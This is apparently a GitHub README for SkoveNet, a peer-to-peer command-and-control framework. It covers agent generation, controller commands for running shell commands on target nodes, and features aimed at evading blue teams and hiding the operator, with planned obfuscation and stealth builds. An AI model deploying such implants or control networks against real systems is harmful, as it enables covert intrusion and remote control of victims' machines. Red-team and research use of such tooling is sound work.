
[![Release](https://github.com/skoveit/skovenet/actions/workflows/release.yml/badge.svg)](https://github.com/skoveit/skovenet/actions/workflows/release.yml) [![Go Report Card](https://goreportcard.com/badge/github.com/skoveit/skovenet)](https://goreportcard.com/report/github.com/skoveit/skovenet) [![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)

![banner](static/banner.jpg)

---

**SkoveNet** is a decentralized Command & Control (C2) framework engineered to eliminate Single Points of Failure and ensure maximum operator anonymity.

Unlike client-server C2 models, SkoveNet implements a decoupled Agent-Controller architecture. This allows the operator to interface with the network through any active node, removing the dependency on a static command center and obfuscating the operator's physical location.

<p align="center">
  <img src="static/structure_diagram.png" alt="structure diagram" />
  <br>
  <b>No single point of failure</b>
</p>

## Core Features
- Fully decentralized P2P mesh network
- Automatic self-healing topology
- Max 5 neighbors per agent → tiny traffic footprint
- Operator = whoever has the cryptographic secret key
- Commands signed with Ed25519 → no spoofing
- End-to-end encrypted (Noise protocol)
- GossipSub broadcast (fast & reliable)
- Single binary, zero dependencies – works on Windows, Linux, macOS, ARM
- NAT traversal & hole punching built-in
- **`sgen`** — standalone agent generator (no Go toolchain required)



## How It Works
Every machine in the network runs an **agent**. The agent is the network. it connects to peers, receives commands, and executes them. The **controller** is just a local CLI that talks to the agent running on your machine. It's how you, the operator, interact with the network. If you are not on the network yet, run **agent** to join, then run **controller**.


<p align="center">
  <img src="https://github.com/user-attachments/assets/5f2961b9-461d-4824-9ad4-2f22753b7614" width="600" />
</p>

## Components

| Binary         | Purpose                                              |
| -------------- | ---------------------------------------------------- |
| **agent**      | P2P node that joins the mesh and executes commands    |
| **controller** | Operator CLI — connects to the local agent via IPC   |
| **sgen**       | Standalone agent generator — no Go toolchain needed   |

## Quick Start

The easiest way to get started is to download the pre-compiled binaries for the **Controller** and **sgen** from the [GitHub Releases](https://github.com/skoveit/skovenet/releases) page.

Alternatively, you can build them from source:

### Building from Source

```bash
# Requires Go 1.25+ 
make sgen
make controller
```

### Generating Agents

```bash
# Generate a Linux agent (auto-creates a new keypair)
./sgen generate --os linux --arch amd64

# Generate a Windows agent with an existing key
./sgen generate --os windows --arch amd64 --key "base64pubkey..."
```

### Running

**Target machine:**
```bash
# join the network (this is the binary output by sgen)
./agent-linux-amd64
```

**Operator machine:**
```bash
# join the network 
./agent-linux-amd64

# connect to the local agent via IPC
./controller
```
**Inside the controller:**
```bash
> sign <private_key>        # Authenticate as operator
> peers                     # List connected nodes
> use <peerID>              # Select a target node
[peerID]> whoami            # Run any shell command directly
[peerID]> background        # Return to global view
> radar                     # Scan for all network nodes
> graph on                  # Open topology web viewer
```

Visit https://skoveit.github.io/skoving/projects/skovenet/ for tutorials and documentation.

## The Paradigm Shift

Traditional C2 frameworks rely on static, centralized infrastructure. SkoveNet shifts the operational security (OpSec) model entirely to an unstructured peer-to-peer mesh:

- **Infrastructure-less Control:** No teamservers, no redirectors, and no domains to seize. The network itself is the infrastructure.
- **Cryptographic Trust Model:** Commands are authenticated via Ed25519 signatures rather than network location or TLS certificates. The operator is simply whoever holds the private key.
- **Self-Healing Topology:** If nodes are discovered or burned by blue teams, the routing graph dynamically recalculates to maintain command flow.
- **Zero-Attribution:** By propagating commands through GossipSub, the concept of an "origin IP" is eradicated, making upstream operator tracing practically unfeasible.


## Engineering Challenge: NAT Traversal
While SkoveNet's decentralized architecture eliminates the traditional Single Point of Failure (SPoF), operating within restricted corporate networks presents a significant hurdle. Standard P2P hole-punching often fails against **Symmetric NATs** and aggressive firewalls that block non-standard egress traffic.

Currently, the framework requires manual **Bootstrap/Relay nodes** (`connect` command) to maintain connectivity in these environments.

We are actively researching the integration of **STUN/TURN** protocols and **DNS-over-HTTPS (DoH)** tunneling to enhance NAT traversal and ensure resilient peer discovery without relying on static relay infrastructure.

## Roadmap [WIP]
- **Traffic Evasion:** Implement pluggable transports (WebSockets, DNS, ICMP) to mask raw libp2p signatures.
- **Obfuscation:** Integrate `garble` into sgen for compile-time obfuscation of generated agents.
- **Dynamic Key Management:** Move from static Ed25519 to a rotating CA model or JWT-based session tokens.
- **Feature Toggles:** Build-tag support in sgen for conditional compilation (`--tags stealth`).

##

> ⚠️ **Legal Disclaimer:** SkoveNet is intended for 
> authorized security research and penetration testing only.
> Unauthorized use against systems you don't own is illegal.
